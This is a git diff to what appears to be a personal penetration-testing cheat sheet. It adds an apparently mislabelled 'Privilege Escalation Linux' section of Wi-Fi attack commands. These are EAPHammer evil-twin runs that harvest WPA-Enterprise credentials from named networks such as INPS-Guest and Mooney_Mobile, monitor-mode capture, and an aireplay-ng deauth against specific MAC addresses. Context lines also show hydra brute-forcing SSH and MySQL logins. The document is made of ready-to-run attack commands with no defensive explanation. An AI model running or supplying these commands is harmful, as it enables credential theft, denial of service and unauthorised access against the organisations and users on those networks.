@@ -178,6 +178,7 @@ openssl pkcs12 -export -out va2022_client_col.p12 -in va2022_client_col.crt -ink
 hydra -L user.txt -P pass.txt  192.168.152.118  mysql
 hydra -l tiago -P /usr/share/wordlists/rockyou.txt 192.168.136.48 -t 4 ssh
 
+
 ```
 ---
 
@@ -480,4 +481,37 @@ mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 
 
 ```
+---
+
+## 🧪 Privilege Escalation Linux
+
+
+```bash
+
+#EapHammer
+# generate certificates
+./eaphammer --cert-wizard
+
+# launch attack
+./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
+
+./eaphammer -i wlx00c0caac1ee2 --channel 149 --auth wpa-eap --essid Mooney_Mobile --creds
+
+
+#Attacco Esempio Wifi
+sudo airmon-ng start wlx00c0caac1ee2
+sudo airodump -i wlx00c0caac1ee2 -b abg
+
+./eaphammer --cert-wizard
+./eaphammer -i wlx00c0caac1ee2 --channel 36 --auth wpa-eap --essid INPS-Base --creds
+./eaphammer -i wlx00c0caac1ee2  --auth wpa-eap --essid INPS-Guest --creds
+python3 eaphammer -i wlan0 --channel 36 --auth wpa-eap --essid Mooney_Mobile --creds --hw-mode a
+
+./eaphammer -i wlx00c0caade2df  --auth wpa-eap --essid INPS-Guest --creds
+
+#deauth uno specifico client 
+aireplay-ng --deauth 0 -a 04:5F:B9:1D:8E:CD -c 3C:6A:A7:67:24:97 --ignore-negative-one
+```
+
+
 https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet
